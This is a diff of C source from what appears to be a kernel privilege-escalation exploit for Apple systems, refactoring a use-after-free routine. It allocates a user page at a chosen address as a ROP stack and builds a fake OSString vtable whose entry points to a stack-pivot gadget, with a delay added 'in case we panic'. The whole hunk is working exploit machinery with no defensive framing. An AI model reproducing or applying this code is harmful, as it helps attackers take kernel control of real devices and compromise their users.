@@ -56,50 +56,42 @@ void uaf_parse(const OSString *fake)
 }
 
 // Don't risk deallocating this once we acquire it
-void** uaf_rop_stack(void)
+addr_t* uaf_rop_stack(void)
 {
-    static void **ptr = NULL;
+    static addr_t *ptr = NULL;
     if(ptr == NULL)
     {
         kern_return_t ret;
         vm_size_t page_size = 0;
         host_page_size(mach_host_self(), &page_size);
-        DEBUG("Page size: 0x%llx", (unsigned long long)page_size);
+        DEBUG("Page size: " SIZE, (size_t)page_size);
 
-        vm_address_t addr = kOSSerializeObject, // dark magic
-                     backup = addr - page_size;
+        vm_address_t addr = kOSSerializeObject; // dark magic
 
-        DEBUG("Allocating ROP error buffer page at 0x%llx", (unsigned long long)backup);
-        ret = vm_allocate(mach_task_self(), &backup, page_size, 0);
-        if(ret != KERN_SUCCESS)
-        {
-            THROW("Failed allocate page at 0x%llx (%s)", (unsigned long long)backup, mach_error_string(ret));
-        }
-
-        DEBUG("Allocating ROP stack page at 0x%llx", (unsigned long long)addr);
+        DEBUG("Allocating ROP stack page at " ADDR, (addr_t)addr);
         ret = vm_allocate(mach_task_self(), &addr, page_size, 0);
         if(ret != KERN_SUCCESS)
         {
-            THROW("Failed allocate page at 0x%llx (%s)", (unsigned long long)addr, mach_error_string(ret));
+            THROW("Failed to allocate page at " ADDR " (%s)", (addr_t)addr, mach_error_string(ret));
         }
-        DEBUG("Allocated ROP pages at 0x%llx and 0x%llx", (unsigned long long)backup, (unsigned long long)addr);
-        ptr = (void**)addr;
+        DEBUG("Allocated ROP page at " ADDR, (addr_t)addr);
+        ptr = (addr_t*)addr;
     }
     return ptr;
 }
 
-void uaf_rop(file_t *kernel)
+void uaf_rop(void)
 {
     DEBUG("Executing ROP chain...");
+    usleep(100); // In case we panic...
 
-    // TODO: copy actual vtab
-    void *vtab[5] =
+    addr_t vtab[5] =
     {
-        (void*)0x0,
-        (void*)0x0,
-        (void*)0x0,
-        (void*)0x0,
-        get_stack_pivot(kernel),
+        0x0,
+        0x0,
+        0x0,
+        0x0,
+        get_stack_pivot(),
     };
     OSString osstr =
     {
